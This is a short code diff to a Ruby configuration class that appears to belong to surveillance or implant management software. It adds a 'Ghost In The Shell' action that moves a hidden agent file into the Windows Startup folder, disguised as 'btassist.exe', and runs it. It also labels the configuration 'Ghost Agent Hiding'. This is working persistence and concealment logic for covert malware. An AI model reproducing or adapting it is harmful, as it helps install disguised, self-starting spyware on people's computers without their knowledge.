@@ -56,6 +56,7 @@ class Configuration
     ghost_action = {"desc"=>"Ghost In The Shell",
       "subactions"=>[
           {"action"=>"execute", "command"=>"cmd.exe /c move $dir$\\ghits \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\btassist.exe\""},
+          {"action"=>"execute", "command"=>"cmd.exe /c move $dir$\\ghits \"%HOMEPATH%\\Start Menu\\Programs\\Startup\\btassist.exe\""},
           {"action"=>"execute", "command"=>"\"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\btassist.exe\""},
       ]}
 
@@ -75,7 +76,7 @@ class Configuration
     config['actions'].delete_if {|hsh| is_ghost_entry?(hsh)}
 
     self.config = config.to_json
-    self.desc = ""
+    self.desc = "Ghost Agent Hiding"
     self.saved = Time.now.getutc.to_i
     self.user = "<system>"
     self.save
